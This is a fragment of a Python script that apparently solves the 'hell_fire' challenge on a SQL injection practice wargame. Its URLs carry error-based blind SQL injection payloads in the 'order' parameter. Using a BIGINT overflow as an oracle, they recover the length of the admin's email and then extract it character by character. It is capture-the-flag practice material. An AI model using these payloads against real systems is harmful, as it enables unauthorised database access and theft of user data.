...
url_start = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"+'?'
pw_len = 0
word_len = 0
...
while 1:
    ...
    url_len = url_start + "order=(select%20(9223372036854775807%2b1)%20where%20(id=%27admin%27%20and%20length(email)={}))".format(str(pw_len))
...
while 1:
    word_len += 1
    url_word = url_start + "order=(select%20(9223372036854775807%2b1)%20where%20(id=%27admin%27%20and%20length(mid(email,1,1))={}))".format(str(word_len))
    #print(word_len)
...
for i in range(1, password_length+1):
    ...
    for j in range(32, 127):
        ...
        url_pw = url_start+"order=(select%20(9223372036854775807%2b1)%20where%20(id=%27admin%27%20and%20ord(mid(email,{},1))={}))".format(str(i), str(j))
